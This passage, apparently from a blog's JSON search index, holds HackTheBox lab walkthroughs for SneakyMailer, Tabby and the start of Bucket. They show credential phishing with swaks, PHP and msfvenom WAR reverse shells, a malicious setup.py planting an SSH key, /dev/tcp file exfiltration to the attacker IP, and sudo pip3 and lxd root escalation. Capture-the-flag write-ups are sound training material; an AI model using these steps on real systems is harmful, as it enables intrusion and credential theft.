from HackTheBox that features an open source web application called \u0026ldquo;Gym Management System\u0026rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator.","tags":["OSCP-like","Windows","Webshell","CloudMe","Binary-exploitation","Buffer-overflow","Tunneling","Port-Forwarding","Chisel"],"title":"HackTheBox - Buff"},{"content":"SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.\nSkills Learned  Phishing PyPI Package Exploitation Exploiting sudo privileges on pip3  Reconnaissance Nmap → root@iamf «sneakymailer» «10.10.14.42» $ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: ENABLE STARTTLS UTF8=ACCEPTA0001 CHILDREN ACL ACL2=UNION THREAD=ORDEREDSUBJECT THREAD=REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: ENABLE AUTH=PLAIN CHILDREN ACL ACL2=UNION THREAD=ORDEREDSUBJECT THREAD=REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8=ACCEPTA0001 NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel With an initial scan, nmap discovered seven ports open and also identified the services behind them.\nI’ll summarize the result:\n There is an FTP service on port 21, but nmap shows no sign that anonymous login is allowed. An SSH service on port 22 Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993 And a web server hosting two sites on port 80 and 8080. nmap identifies the hostname as sneakycorp.htb.  I’ll add sneakycorp.htb to my /etc/hosts file:\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo \u0026#39;10.10.10.197 sneakycorp.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Enumeration TCP 80 - Website Visiting sneakycorp.htb on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as \u0026ldquo;Complete!\u0026rdquo; while the other one seems still in progress for about 80%.\nClicking on the \u0026ldquo;Team\u0026rdquo; menu points to/team.php. This page shows a table contains the employees' data of SneakyCorp.\nI saved the whole table data and stored it in a file called team.\nI can grab the emails using the grep and tr command as follows:\n→ root@iamf «sneakymailer» «10.10.14.42» $ cat team | egrep -o \u0026#34;[^[:space:]]+@[^[:space:]]+\u0026#34; | tr -d \u0026#34;\u0026lt;\u0026gt;\u0026#34; | tee emails.list I ran gobuster but it didn\u0026rsquo;t show any interesting results.\nTCP 8080 — Website It returns the default Nginx page.\nTCP 25 — SMTP (Mail) I tried to send an email, and it got queued.\nGiven a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.\nEmail Phishing I\u0026rsquo;ll setup netcat listener on port 80, and then I\u0026rsquo;ll use a tool called swaks to send an email containing my IP address to all the email addresses I\u0026rsquo;ve got.\n→ root@iamf «sneakymailer» «10.10.14.42» $ swaks --server \u0026#39;10.10.10.197\u0026#39; --to `cat emails.list | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39;` --from admin@sneakymailer.htb --body \u0026#34;http://10.10.14.42/\u0026#34; And there is an HTTP POST request coming to my listener.\nThe request body contains this data.\nfirstName=Paul\u0026amp;lastName=Byrd\u0026amp;email=paulbyrd%40sneakymailer.htb\u0026amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt It can be decoded using an online url decoder.\nfirstName=Paul\u0026amp;lastName=Byrd\u0026amp;email=paulbyrd@sneakymailer.htb\u0026amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht\u0026amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht The parameter password and rpassword seem juicy where the r might refer to reset or retype the password. Unfortunately, the password doesn\u0026rsquo;t work on SSH and FTP.\nTCP 143 - IMAP With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I\u0026rsquo;ll need an email client, and I end up with sylpheed. You can install it with sudo apt-get install sylpheed.\nBut before moving on, I\u0026rsquo;ll add sneakymailer.htb to my/etc/hosts file to avoid problems with dns/name resolution.\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo \u0026#39;10.10.10.197 sneakymailer.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Initial Setup As this is my first install, I\u0026rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on/root/sneaky/loot/Mail.\nNext I\u0026rsquo;ll have to determine the account type. Because the box only has IMAP listening and we\u0026rsquo;re not going outside VPN connection, then I should choose IMAP4.\nIn the following section, I\u0026rsquo;ll use the display name Paul and the email address paulbyrd@sneakymailer.htb that I obtained through phishing.\nI lost some screenshots after the step above, but here is the final configuration.\nLastly, enter paulbyrd\u0026rsquo;s password, ^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.\nRetrieving the emails In Paul\u0026rsquo;s mailbox, I found two emails inside the \u0026ldquo;Sent Items\u0026rdquo; folder.\nThe first email was sent with the subject of \u0026ldquo;Password Reset\u0026rdquo;. In this email, Paul asks the administrator to change the developer account password. I\u0026rsquo;ll grab the credentials of the developer account.\nThe second email was sent with the subject \u0026ldquo;Module testing\u0026rdquo;, but right now I\u0026rsquo;m not sure what it is about.\nFoothold Shell as www-data FTP Access The developer account can be used to access the FTP server. There is only one directory called/dev in the FTP root directory.\nI access the FTP server via browser. The files inside this FTP look the same files as the one hosted on sneakycorp.htb, except it has the additional word \u0026ldquo;dev\u0026rdquo; in the title.\nReverse Shell via FTP Upload It turns out that the developer account has write permission on the /dev directory, so I can drop a PHP reverse shell payload there.\n211-FTP server status: Connected to ::ffff:10.10.14.20 Logged in as developer TYPE: ASCII No session bandwidth limit Session timeout in seconds is 300 Control connection is plain text Data connections will be plain text At session startup, client count was 1 vsFTPd 3.0.3 - secure, fast, stable ftp\u0026gt; cd /dev 250 Directory successfully changed. ftp\u0026gt; put /shares/reversef.php iamf.php local: /shares/reversef.php remote: iamf.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 72 bytes sent in 0.00 secs (2.8610 MB/s) At first I thought it was on http://sneakycorp.htb/iamf.php, the uploaded shell was available on http://dev.sneakycorp.htb/iamf.php, so I\u0026rsquo;ll have to add dev.sneakycorp.htb to my /etc/hosts.\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo \u0026#39;10.10.10.194\u0026#39; \u0026gt;\u0026gt; dev.sneakycorp.htb Now I can trigger my web shell with curl.\n→ root@iamf «sneakymailer» «10.10.14.42» $ curl -s http://dev.sneakycorp.htb/iamf.php The listener has an interactive shell now.\nAfter gaining access to the box, I can re-enumerate and search for files containing sensitive data.\nPrivilege Escalation Shell as low Enumeration In /var/www, I found another subdomain. The new is pypi.sneakycorp.htb, I\u0026rsquo;ll add it to my /etc/hosts file.\nI discovered .htpasswd file inside pypi.sneakycorp.htb, which contains PyPI credentials.\nI\u0026rsquo;ll save pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ to my note and send it to my Windows for cracking. In /home there is no user called pypi, so it might be used for something else.\nCracking Password The password can be cracked easily with John the Ripper.\nThe password is soufianeelhaoui\nMalicious PyPI package Looking into the web configuration file, pypi.sneakycorp.htb is accessible on localhost:5000.\nIt is also accessible from remote on port 8080 if I specify the hostname, pypi.sneakycorp.htb.\nRemember about the second email Paul sent to user law?\nHello low Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user low install the package (configured by the box\u0026rsquo;s author automatically).\nTo create a package, I\u0026rsquo;ll use the official site tutorial as my reference:\n https://packaging.python.org/tutorials/packaging-projects/ And you might want to read this too, https://packaging.python.org/specifications/pypirc/  First, I\u0026rsquo;ll get the setup.py template which looks like this:\nimport setuptools with open(\u0026#34;README.md\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as fh: long_description = fh.read() setuptools.setup( name=\u0026#34;example-pkg-YOUR-USERNAME-HERE\u0026#34;, # Replace with your own username version=\u0026#34;0.0.1\u0026#34;, author=\u0026#34;Example Author\u0026#34;, author_email=\u0026#34;author@example.com\u0026#34;, description=\u0026#34;A small example package\u0026#34;, long_description=long_description, long_description_content_type=\u0026#34;text/markdown\u0026#34;, url=\u0026#34;https://github.com/pypa/sampleproject\u0026#34;, project_urls={ \u0026#34;Bug Tracker\u0026#34;: \u0026#34;https://github.com/pypa/sampleproject/issues\u0026#34;, }, classifiers=[ \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;License :: OSI Approved :: MIT License\u0026#34;, \u0026#34;Operating System :: OS Independent\u0026#34;, ], package_dir={\u0026#34;\u0026#34;: \u0026#34;src\u0026#34;}, packages=setuptools.find_packages(where=\u0026#34;src\u0026#34;), python_requires=\u0026#34;\u0026gt;=3.6\u0026#34;, ) My goal is only to insert my SSH public key to low\u0026rsquo;s authorized_keys, so I\u0026rsquo;ll need to modify the code to this:\nimport setuptools try: with open(\u0026#34;/home/low/.ssh/authorized_keys\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd\u0026#34;) f.close() except Exception as e: pass setuptools.setup( name=\u0026#34;low\u0026#34;, version=\u0026#34;0.0.1\u0026#34;, author=\u0026#34;Example Author\u0026#34;, author_email=\u0026#34;author@example.com\u0026#34;, description=\u0026#34;A small example package\u0026#34;, long_description=\u0026#34;\u0026#34;, long_description_content_type=\u0026#34;text/markdown\u0026#34;, url=\u0026#34;https://github.com/pypa/sampleproject\u0026#34;, packages=setuptools.find_packages(), classifiers=[ \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;License :: OSI Approved :: MIT License\u0026#34;, \u0026#34;Operating System :: OS Independent\u0026#34;, ], ) From the link above, in order to upload a package to the PyPI server, a file called .pypirc must be present at $HOME/.pypirc.\nThe file is required for authentication, so I\u0026rsquo;ll create one and put the PyPI credentials I obtained before.\n[distutils] index-servers = local [local] repository: http://127.0.0.1:5000 username: pypi password: soufianeelhaoui If I wanted to upload remotely, my .pypirc would look like this:\n[distutils] index-servers = remote [remote] repository: http://pypi.sneakycorp.htb:8080 username: pypi password: soufianeelhaoui I\u0026rsquo;ll transfer setup.py and .pypirc to /dev/shm of SneakyMailer via Python http server.\n→ root@iamf «exploits» «10.10.14.42» $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.197 - - [12/Jul/2020 08:24:12] \u0026#34;GET /.pypirc HTTP/1.1\u0026#34; 200 - 10.10.10.197 - - [12/Jul/2020 08:24:29] \u0026#34;GET /setup.py HTTP/1.1\u0026#34; 200 - On SneakyMailer:\nwww-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc \u0026gt; .pypirc www-data@sneakymailer:/dev/shm$ www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py \u0026gt; setup.py Now at /dev/shm, the folder structure looks like this.\n. ├── .pypirc ├── iamf.php └── setup.py The last part is set $HOME to /dev/shm, because .pypirc should be placed at $HOME/.pypirc.\nwww-data@sneakymailer:/dev/shm$ export $HOME=/dev/shm www-data@sneakymailer:~$ After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.\nwww-data@sneakymailer:~$ python3 setup.py sdist upload -r local running sdist running egg_info writing low.egg-info/PKG-INFO writing dependency_links to low.egg-info/dependency_links.txt writing top-level names to low.egg-info/top_level.txt reading manifest file \u0026#39;low.egg-info/SOURCES.txt\u0026#39; writing manifest file \u0026#39;low.egg-info/SOURCES.txt\u0026#39; warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md running check creating low-0.0.1 creating low-0.0.1/low.egg-info copying files to low-0.0.1… copying setup.py -\u0026gt; low-0.0.1 copying low.egg-info/PKG-INFO -\u0026gt; low-0.0.1/low.egg-info copying low.egg-info/SOURCES.txt -\u0026gt; low-0.0.1/low.egg-info copying low.egg-info/dependency_links.txt -\u0026gt; low-0.0.1/low.egg-info copying low.egg-info/top_level.txt -\u0026gt; low-0.0.1/low.egg-info Writing low-0.0.1/setup.cfg Creating tar archive removing \u0026#39;low-0.0.1\u0026#39; (and everything under it) running upload Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/ Server response (200): OK WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/) As long as I see the server response is 200, that means I have successfully uploaded the package.\nSSH Access Now I can login with my private key as user low.\n→ root@iamf «sneakymailer» «10.10.14.42» $ ssh -i id_ecdsa low@10.10.10.197 User flag is done here.\nShell as root Abusing sudo pip User low has sudo privileges on /usr/bin/pip3.\nI\u0026rsquo;ll follow the instruction from GTFOBins to abuse this circumstance to obtain the root flag.\nlow@sneakymailer:~$ TF=$(mktemp -d) low@sneakymailer:~$ low@sneakymailer:~$ echo \u0026#39;raise Exception(open(\u0026#34;/root/root.txt\u0026#34;).read())\u0026#39; \u0026gt; $TF/setup.py low@sneakymailer:~$ low@sneakymailer:~$ sudo pip3 install $TF Or to get a shell as follows:\nlow@sneakymailer:~$ TF=$(mktemp -d) low@sneakymailer:~$ low@sneakymailer:~$ echo \u0026#34;import os; os.execl(\u0026#39;/bin/sh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sh \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\u0026#39;)\u0026#34; \u0026gt; $TF/setup.py low@sneakymailer:~$ low@sneakymailer:~$ sudo pip3 install $TF sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution Processing /tmp/tmp.9ShSegy5bm # whoami root # id uid=0(root) gid=0(root) groups=0(root)  References    ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/","summary":"SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.","tags":["OSCP-like","Linux","SMTP","IMAP","Sylpheed","Phishing","Webshell","Python","PyPI","sudo","GTFObins"],"title":"HackTheBox - SneakyMailer"},{"content":"Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.\nSkills Learned  Local File Inclusion Abusing Tomcat manager-script roles Privilege escalation with lxc/lxd group.  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux BurpSuite - https://portswigger.net/burp curl - Preinstalled in Kali Linux msfvenom - Preinstalled in Kali Linux alpine-builder - https://github.com/saghul/lxd-alpine-builder  Reconnaissance Nmap → root@iamf «tabby» «10.10.14.30» $ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds An initial nmap scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).\nEnumeration TCP 80 - Website Visiting port 80 shows a company website that offers hosting services called \u0026ldquo;Mega Hosting\u0026rdquo;.\n The domain name of this site is revealed from the email address and also from the page source\n I\u0026rsquo;ll add megahosting.htb to /etc/hosts file.\n10.10.10.194 megahosting.htb The company statement about data breach points to this link http://megahosting.htb/news.php?file=statement.\n They mentioned a tool, but I have no idea what tool it is.\nI ran gobuster but found nothing really interesting there.\nTCP 8080 - Tomcat Visiting port 8080 shows the Tomcat default page.\n Both \u0026ldquo;manager webapp\u0026rdquo; and \u0026ldquo;host-manager webapp\u0026rdquo; are asking for credentials. I tried using Tomcat\u0026rsquo;s default credentials, but it didn\u0026rsquo;t work.\n I\u0026rsquo;ll take note on these:\n /etc/tomcat9/tomcat-users.xml \u0026ldquo;tomcat9\u0026rdquo;  Foothold Shell as tomcat Local File Inclusion (LFI) I found out the file parameter on http://megahosting.htb/news.php?file=statement is vulnerable to LFI.\n The LFI can be identified by assuming the website is hosted at /var/www/html/megahosting/. So the payload would be ../../../../file/to/read\n But the read access is limited.\nGetting tomcat Credentials According to the Tomcat default page, it says that \u0026ldquo;Users are defined in /etc/tomcat9/tomcat-users.xml\u0026rdquo;, so I tried to leverage the LFI to read that file but it returned with a blank.\nWith basic Linux knowledge and service fingerprint from the nmap result, I can search for the exact location of the installed Tomcat.\nFirst, in Linux, every software application is most likely installed in one of the following directories:\n /usr/share/appname /usr/lib/appname /opt/appname /var/lib/appname  Second, according to the nmap result, OpenSSH version 8.2p1 and Apache version 2.4.41. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the search, and find the install location of Tomcat9 on Ubuntu 20.04.\nThe search brought me to this location /usr/share/tomcat9/etc/tomcat-users.xml, and that seems to be the correct location.\n The credentials is tomcat:$3cureP4s5w0rd123!\nHTML GUI - host-manager-webapp When I tried to access the host-manager-webapp with -not-working- default credentials, the page says something about the roles that concerns me.\n Then, based on the tomcat-users.xml file, tomcat has two roles, admin-gui and manager-script. That means the credentials is not authorized on manager-webapp (/manager), but it will work on host-manager-webapp (/host-manager),\n Another interesting one is, if I clicked the Server Status from /host-manager it just redirects me to http://10.10.10.194:8080/manager/status/all, and it doesn\u0026rsquo;t complain about the authorization. The page is seen below\n So, I think I can access some features behind /manager/[here]. From the page above, the server accepts JSP/JSPX files.\nText Interface - manager-webapp The second role of user tomcat is manager-script.\nFrom this article\n manager-script provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI\n This concludes that I can access some features behind /manager/ but not from the GUI, instead it uses text-based. The full documentation of what you can do with this role is available here\nDeploying Malicious WAR With manager-script role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious .war file that is embedded with jsp reverse shell.\nFirst, I\u0026rsquo;ll craft a .war file payload using msfvenom.\n→ root@iamf «tabby» «10.10.14.30» $ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.30 lport=9000 -f war -o iamf.war Then I\u0026rsquo;ll upload the payload using curl.\n→ root@iamf «tabby» «10.10.14.30» $ curl -u \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path=/iamf.war  -u : for credential [username:password] -T : for transfer file  I\u0026rsquo;ll setup listener, and then trigger the payload also using curl.\n→ root@iamf «tabby» «10.10.14.30» $ curl http://10.10.10.194:8080/iamf.war My listener now have a shell.\n I can upgrade the shell into TTY using this trick.\n$ script /dev/null; bash Privilege Escalation Shell as ash Enumeration\nManual enumeration with the find command discovered a backup file in zip format that is owned by user ash\ntomcat@tabby:/$ find / -type f -user ash 2\u0026gt;/dev/null | grep -v \u0026#39;proc\u0026#39;  I\u0026rsquo;ll transfer the backup file to my Kali.\ntomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip \u0026gt; /dev/tcp/10.10.14.30/9001 And receive it on my listener.\n→ root@iamf «tabby» «10.10.14.30» $ nc -nvlp 9001 \u0026gt; 16162020_backup.zip listening on [any] 9001 ... connect to [10.10.14.30] from (UNKNOWN) [10.10.10.194] 65056 Recover Backup Password The backup file is protected by a password. I\u0026rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I\u0026rsquo;ll have to convert it to hash format using zip2john.\n→ root@iamf «tabby» «10.10.14.30» $ zip2john 16162020_backup.zip \u0026gt; backup.hash The password got cracked instantly.\njohn.exe --wordlist=rockyou.txt backup.hash  The password is admin@it.\nSU - ash It turns out that the backup password is reused by ash\ntomcat@tabby:/$ su ash su ash Password: admin@it I\u0026rsquo;ll put my SSH public key to the authorized_keys file on ash home directory for better shell.\nash@tabby:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=' \u0026gt; authorized_keys Now I can login with my key.\n→ root@iamf «tabby» «10.10.14.30» $ ssh -i id_rsa ash@10.10.10.194 ash@tabby:~$ ash@tabby:~$ sudo -l [sudo] password for ash: Sorry, user ash may not run sudo on tabby. ash@tabby:~$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Shell as root Abusing lxc I found out that user ash is a member of the lxd group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.\n It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting / (root file system) to the container and interacting with it from inside the container as a privileged user.\n I\u0026rsquo;ll use this article as reference.\nFirst, I’ll create an alpine image on my attacking machine, which is Kali Linux.\n→ root@iamf «tabby» «10.10.14.30» $ git clone https://github.com/saghul/lxd-alpine-builder → root@iamf «tabby» «10.10.14.30» $ cd lxd-alpine-builder → root@iamf «tabby» «10.10.14.30» $ ./build-alpine  Once it\u0026rsquo;s done, there will be an image file called alpine-v3.12-x86_64-blablabla. In my case, it is alpine-v3.12-x86_64-20201107_1900.tar.gz. I\u0026rsquo;ll send the image to Tabby via scp.\n→ root@iamf «tabby» «10.10.14.30» $ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz ash@10.10.10.194:/tmp I\u0026rsquo;ll initialize the lxd (storage pool, profile, etc..).\nash@tabby:~$ lxd init I\u0026rsquo;ll import the image, and then initialize the image.\nash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img ash@tabby:~$ ash@tabby:~$ lxc init iamf-img img-container -c security.privileged=true Next, I\u0026rsquo;ll mount the root file system of the host to the container at /mnt/root.\nash@tabby:~$ lxc config device add img-container iamf-test disk source=/ path=/mnt/root Device iamf-test added to img-container After that, I\u0026rsquo;ll start the container. I can confirm it is running using lxc ls.\nash@tabby:~$ lxc start img-container  Now I can just interact with the container and grab the root flag on /mnt/root/root/root.txt\nash@tabby:~$lxc exec img-container /bin/sh  Modifications on /mnt/root/ will also affect the root file system of the host. Other things I can do from the container is:\n Adding a persistent user via /etc/passwd (/mnt/root/etc/passwd) Adding a SUID bash (cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash) Enabling root login and put my SSH public key to the root authorized_keys file.   References  https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-tabby/","summary":"Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box.","tags":["OSCP-like","Linux","LFI","Tomcat","Password-cracking","WAR-file","Container","lxc","lxd","zip2john"],"title":"HackTheBox - Tabby"},{"content":"Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is an internal web currently running as a root user, which then can be exploited to gain root access.\nSkills Learned  Pentesting AWS S3 Port Forwarding Exploiting PD4ML  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Gobuster - https://github.com/OJ/gobuster AWS CLI - https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install  Reconnaissance Nmap nmap shows two open ports: 22 (SSH) and 80 (HTTP).\n→ root@iamf «bucket» «10.10.14.39» $ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Scanning through all the ports return the same result.\nEnumeration TCP 80 - bucket.htb Visiting this port via browser redirects to http://bucket.htb/\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://10.10.10.212 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://bucket.htb/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; I\u0026rsquo;ll add bucket.htb to /etc/hosts\n10.10.10.212 bucket.htb Now it displays a web page called \u0026ldquo;Bucket Advertising Platform\u0026rdquo;.\n Inspecting the page source discovers a vhost.\n I\u0026rsquo;ll add the vhost name to /etc/hosts\n10.10.10.212 bucket.htb s3.bucket.htb Gobuster There\u0026rsquo;s no interesting results.\n→ root@iamf «bucket» «10.10.14.39» $ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80 ...\u0026lt;SNIP\u0026gt;... /index.html (Status: 200) [Size: 5344] /server-status (Status: 403) [Size: 275] TCP 80 - s3.bucket.htb Visiting the newly discovered hostname displays a typical json output format.\n Gobuster gobuster scan discovers a few web paths.\n→ root@iamf «bucket» «10.10.14.39» $ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80 ...\u0026lt;SNIP\u0026gt;... /shell (Status: 200) [Size: 0] /health (Status: 200) [Size: 54] /server-status (Status: 403) [Size: 275] /shell Vising /shell redirects to http://444af250749d:4566/shell/.\n On curl, the server returns with a bunch of HTTP headers in its response\n→ root@iamf «~» «10.10.14.51» $ curl -sv http://s3.bucket.htb/shell ...\u0026lt;SNIP\u0026gt;... \u0026lt; refresh: 0; url=http://444af250749d:4566/shell/ \u0026lt; access-control-allow-origin: * \u0026lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH \u0026lt; access-control-allow-headers: 